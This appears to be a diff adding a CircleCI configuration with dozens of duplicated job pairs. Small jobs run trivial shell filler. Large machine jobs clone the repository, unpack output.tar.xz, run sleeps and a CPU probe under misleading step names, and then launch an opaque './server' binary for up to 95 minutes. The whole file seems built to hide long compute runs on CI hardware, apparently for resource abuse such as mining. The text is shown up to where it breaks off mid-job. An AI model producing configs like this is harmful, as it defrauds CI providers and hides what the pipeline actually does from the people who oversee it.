@@ -1,0 +1,1764 @@
+version: 2.1
+
+jobs:
+  retry_do-the-thing:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: to leeward
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=0; for(i=1;i<=1000;i++)n^=i; print n}'; true ; } > /tmp/handoff/664.out
+            echo "gate do-the-thing: $(wc -c </tmp/handoff/664.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 664.out
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/664.out
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  cacher_ValidateService:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: today for sure
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; printf "%d" $$ | md5sum; true ; } > /tmp/handoff/metrics.json
+            echo "gate ValidateService: $(wc -c </tmp/handoff/metrics.json) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - metrics.json
+  ValidateService:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/metrics.json
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  compile_foxtrot-5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: reef knot
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 100 | tr '\n' ','  | sed 's/,$/\n/' | head -c 60; true ; } > /tmp/handoff/event.ndjson
+            echo "gate foxtrot-5: $(wc -c </tmp/handoff/event.ndjson) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - event.ndjson
+  foxtrot-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/payload
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  ctx_v6-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: charleston kick
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{if(c[int($1/10)]++)}' | wc -l 2>/dev/null || seq 1 100 | awk '{c[int($1/10)]++}END{for(k in c)print k,c[k]}'; true ; } > /tmp/handoff/22.data
+            echo "gate v6-alpha: $(wc -c </tmp/handoff/22.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 22.data
+  v6-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/22.data
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  fixture_v7-preview:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: hanging knee raise
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=2;i<=200;i++){isp=1;for(j=2;j*j<=i;j++)if(i%j==0){isp=0;break}; if(isp)c++} print c}'; true ; } > /tmp/handoff/2024-04-16.data
+            echo "gate v7-preview: $(wc -c </tmp/handoff/2024-04-16.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 2024-04-16.data
+  v7-preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/2024-04-16.data
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  validate_cf-2a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: rollback 2
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; yes "abc" | head -500 | sort | uniq | wc -l; true ; } > /tmp/handoff/final.out
+            echo "gate cf-2a: $(wc -c </tmp/handoff/final.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - final.out
+  cf-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/payload
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  enqueue_hotfix-1682:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: double rap
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tty 2>/dev/null || echo no-tty; true ; } > /tmp/handoff/payload
+            echo "gate hotfix-1682: $(wc -c </tmp/handoff/payload) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - payload
+  hotfix-1682:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/payload
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  p2_defualt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: spin
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=0; for(i=1;i<=100;i++)s+=i^2; print s}'; true ; } > /tmp/handoff/.done
+            echo "gate defualt: $(wc -c </tmp/handoff/.done) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .done
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/.done
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  p1_jan1-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: thread fine
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; echo $((2**15)); true ; } > /tmp/handoff/package.tar
+            echo "gate jan1-release: $(wc -c </tmp/handoff/package.tar) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - package.tar
+  jan1-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/package.tar
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  step1_green-light:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: retrograde
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{OFS=","; print 1,2,3; print "a","b","c"}'; true ; } > /tmp/handoff/step-done.log
+            echo "gate green-light: $(wc -c </tmp/handoff/step-done.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-done.log
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/step-done.log
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  syncer_QA_DEPLOY_4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: tbd
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc 'a-f0-9' < /dev/urandom | head -c 32; true ; } > /tmp/handoff/handoff.ok
+            echo "gate QA_DEPLOY_4: $(wc -c </tmp/handoff/handoff.ok) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - handoff.ok
+  QA_DEPLOY_4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/handoff.ok
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  tap_go1-21-cov:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: ugh
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; echo {a..z} | wc -w; true ; } > /tmp/handoff/trace.ndjson
+            echo "gate go1-21-cov: $(wc -c </tmp/handoff/trace.ndjson) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - trace.ndjson
+  go1-21-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/trace.ndjson
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  preflight_DATA-556:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: cnc mill
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=sprintf("[%5s]","hi"); print s}'; true ; } > /tmp/handoff/FINAL
+            echo "gate DATA-556: $(wc -c </tmp/handoff/FINAL) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - FINAL
+  DATA-556:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/FINAL
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  redo_oct8-cleanup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: testing 123
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=9;a++)for(b=1;b<=28666;b++)s+=a*b;print s}'; true ; } > /tmp/handoff/timings.jsonl
+            echo "gate oct8-cleanup: $(wc -c </tmp/handoff/timings.jsonl) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - timings.jsonl
+  oct8-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/timings.jsonl
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  compile_ci-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: water log
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk 'NR>50' | wc -l; true ; } > /tmp/handoff/2024-07-23.data
+            echo "gate ci-v2: $(wc -c </tmp/handoff/2024-07-23.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 2024-07-23.data
+  ci-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/2024-07-23.data
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  phase_artifacts:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: rerun
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=200;i++)print i*i}' | sort -n | tail -1; true ; } > /tmp/handoff/log.gz
+            echo "gate artifacts: $(wc -c </tmp/handoff/log.gz) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - log.gz
+  artifacts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/log.gz
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  inspect_qi-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: yeah
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 382142 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/handoff/counts.csv
+            echo "gate qi-ci: $(wc -c </tmp/handoff/counts.csv) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - counts.csv
+  qi-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/payload
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  g2_package:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: bilge pump
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; mkdir -p /tmp/_d && chmod 755 /tmp/_d && stat -c %a /tmp/_d && rm -rf /tmp/_d; true ; } > /tmp/handoff/2023-05-27.data
+            echo "gate package: $(wc -c </tmp/handoff/2023-05-27.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 2023-05-27.data
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/2023-05-27.data
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  hook_uma-push:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: stand up
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; printf 'line1\npattern here\nline2\nmore pattern' | sed '/pattern/!d' | wc -l; true ; } > /tmp/handoff/artifact.pkg
+            echo "gate uma-push: $(wc -c </tmp/handoff/artifact.pkg) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - artifact.pkg
+  uma-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/artifact.pkg
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  orchestrate_shippit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: splish splash
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; date +%Z; true ; } > /tmp/handoff/.pid
+            echo "gate shippit: $(wc -c </tmp/handoff/.pid) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .pid
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/.pid
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  A_zulu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: weigh anchor
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; printf "1 10\n2 20\n3 30\n" | awk '{s+=$2}END{print "sum="s}'; true ; } > /tmp/handoff/metrics.csv
+            echo "gate zulu: $(wc -c </tmp/handoff/metrics.csv) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - metrics.csv
+  zulu:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/metrics.csv
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  p1_phoenix-rc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: blue light
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; echo "mixer" | sha1sum | md5sum | sha256sum | awk '{print $1}' | head -c 24; true ; } > /tmp/handoff/bundle.tgz
+            echo "gate phoenix-rc: $(wc -c </tmp/handoff/bundle.tgz) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - bundle.tgz
+  phoenix-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
+            cat /tmp/handoff/payload
+      - run:
+          name: Download source
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: tar -I xz -xf output.tar.xz
+      - run:
+          name: Store metadata
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Collect artifacts
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Settle filesystem
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          no_output_timeout: 95m
+          command: env ./server
+  env_PrepareService:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: veer east
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 4716); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/handoff/checkpoint-C.pickle
+            echo "gate PrepareService: $(wc -c </tmp/handoff/checkpoint-C.pickle) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - checkpoint-C.pickle
+  PrepareService:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fetch workspace file
+          command: |
